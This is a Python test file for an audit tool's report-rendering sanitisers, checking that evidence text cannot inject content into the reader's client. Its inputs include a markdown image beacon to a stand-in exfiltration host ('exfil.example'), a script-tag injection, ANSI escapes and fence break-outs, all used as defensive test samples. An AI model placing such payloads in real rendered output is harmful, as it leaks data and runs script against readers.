"""Report rendering must not let evidence act on the reader's client (threat T8)."""

from __future__ import annotations

import re

from auditglass.audit.report import neutralise_block, neutralise_inline, strip_control


def test_ansi_escapes_are_removed():
    assert strip_control("\x1b[2J\x1b[31mred\x1b[0m") == "red"
    assert "\x1b" not in neutralise_block("\x1b[1;32mall clear\x1b[0m")


def test_control_characters_are_removed():
    assert strip_control("a\x00b\x07c\x7f") == "abc"


def test_image_syntax_is_defused_in_blocks():
    """The channel that fires on render, with no click."""
    out = neutralise_block("![](https://exfil.example/p?d=1)")
    assert re.search(r"(?<!\\)!\[", out) is None
    # The URL is still readable — the report is evidence, not a redaction.
    assert "exfil.example" in out


def test_fences_cannot_break_out_of_a_block():
    out = neutralise_block("```\n# heading injected\n```")
    assert "```" not in out
    assert "'''" in out


def test_inline_text_cannot_become_a_link_or_image():
    out = neutralise_inline("![](http://x.example) and [click](http://y.example)")
    assert re.search(r"(?<!\\)\[", out) is None
    assert "<" not in out.replace("\\<", "")


def test_inline_text_cannot_break_a_table():
    out = neutralise_inline("a | b | c")
    assert out.count("\\|") == 2


def test_inline_text_cannot_inject_html():
    out = neutralise_inline("<script>alert(1)</script>")
    assert "<script>" not in out


def test_newlines_are_flattened_inline():
    assert "\n" not in neutralise_inline("line one\nline two")


def test_benign_text_survives_readably():
    """Neutralisation that mangles ordinary log lines would make reports useless."""
    text = "timed out acquiring connection from pool after 5000ms"
    assert neutralise_inline(text) == text
    assert neutralise_block(text) == text
